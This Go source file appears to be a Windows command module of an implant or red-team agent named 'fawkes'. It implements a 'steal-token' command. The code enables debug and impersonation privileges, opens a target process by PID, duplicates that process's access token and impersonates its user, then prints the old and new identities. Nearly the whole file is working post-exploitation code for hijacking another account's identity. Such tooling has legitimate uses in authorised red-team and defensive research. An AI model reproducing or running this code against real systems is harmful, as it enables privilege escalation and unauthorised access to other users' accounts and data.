//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	advapi32                = windows.NewLazySystemDLL("advapi32.dll")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf        = advapi32.NewProc("RevertToSelf")
	procLookupPrivilegeValue = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
)

const (
	SE_PRIVILEGE_ENABLED      = 0x00000002
	SE_DEBUG_NAME             = "SeDebugPrivilege"
	SE_IMPERSONATE_NAME       = "SeImpersonatePrivilege"
	SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege"
)

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

func enablePrivilege(privilegeName string) error {
	var hToken windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken)
	if err != nil {
		return err
	}
	defer hToken.Close()

	var luid LUID
	privName, _ := windows.UTF16PtrFromString(privilegeName)
	ret, _, _ := procLookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue failed")
	}

	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}

	ret, _, _ = procAdjustTokenPrivileges.Call(
		uintptr(hToken),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed")
	}

	return nil
}

func enableTokenPrivileges() error {
	// Enable critical privileges for token manipulation
	privileges := []string{SE_DEBUG_NAME, SE_IMPERSONATE_NAME, SE_ASSIGNPRIMARYTOKEN_NAME}
	for _, priv := range privileges {
		if err := enablePrivilege(priv); err != nil {
			// Don't fail if we can't enable all - some might not be available
			continue
		}
	}
	return nil
}

type StealTokenCommand struct{}

func (c *StealTokenCommand) Name() string {
	return "steal-token"
}

func (c *StealTokenCommand) Description() string {
	return "Steal and impersonate a token from another process"
}

func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var params struct {
		PID int `json:"pid"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := stealToken(uint32(params.PID))
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to steal token: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func stealToken(pid uint32) (string, error) {
	var output string

	// Enable required privileges for token manipulation
	enableTokenPrivileges()

	// Get original context before stealing (like Apollo shows "Old Claims")
	processHandle, err := windows.GetCurrentProcess()
	if err == nil {
		var processToken windows.Token
		err = windows.OpenProcessToken(processHandle, windows.TOKEN_QUERY, &processToken)
		if err == nil {
			defer processToken.Close()
			processUser, err := processToken.GetTokenUser()
			if err == nil {
				processUsername, processDomain, _, err := processUser.User.Sid.LookupAccount("")
				if err == nil {
					output += fmt.Sprintf("Old identity: %s\\%s\n", processDomain, processUsername)
				}
			}
		}
	}

	// Open target process with maximum allowed access (like Apollo)
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Open process token with TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY (like Apollo)
	var hToken windows.Token
	err = windows.OpenProcessToken(
		hProcess,
		windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY,
		&hToken,
	)
	if err != nil {
		return output, fmt.Errorf("failed to open process token: %v", err)
	}
	defer hToken.Close()

	// Get token user information to display who we're stealing from
	var targetUsername, targetDomain string
	var targetSid *windows.SID
	tokenUser, err := hToken.GetTokenUser()
	if err == nil {
		targetSid = tokenUser.User.Sid
		targetUsername, targetDomain, _, err = tokenUser.User.Sid.LookupAccount("")
		if err == nil {
			output += fmt.Sprintf("Target identity: %s\\%s (PID: %d)\n", targetDomain, targetUsername, pid)
		}
	}

	// Duplicate the token for impersonation
	// Use TokenImpersonation (like Apollo) not TokenPrimary for thread impersonation
	var hDupToken windows.Token
	err = windows.DuplicateTokenEx(
		hToken,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenImpersonation,
		&hDupToken,
	)
	if err != nil {
		return output, fmt.Errorf("failed to duplicate token: %v", err)
	}
	defer hDupToken.Close()

	// Impersonate the token
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(hDupToken))
	if ret == 0 {
		return output, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
	}

	// Verify impersonation by checking thread token
	var hThreadToken windows.Token
	err = windows.OpenThreadToken(
		windows.CurrentThread(),
		windows.TOKEN_QUERY,
		false,
		&hThreadToken,
	)
	if err != nil {
		// If we can't open thread token, that's actually a problem
		output += fmt.Sprintf("Warning: Cannot verify impersonation - failed to open thread token: %v\n", err)
		return output, nil
	}
	defer hThreadToken.Close()

	// Get the thread token user to verify and display (like Apollo shows "New Claims")
	threadTokenUser, err := hThreadToken.GetTokenUser()
	if err == nil {
		currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
		if err == nil {
			output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
			
			// Verify using SID comparison (more reliable than string comparison)
			if targetSid != nil && !targetSid.Equals(threadTokenUser.User.Sid) {
				output += fmt.Sprintf("\nWarning: Impersonation may not have worked correctly (SID mismatch)")
			}
		}
	}

	return output, nil
}
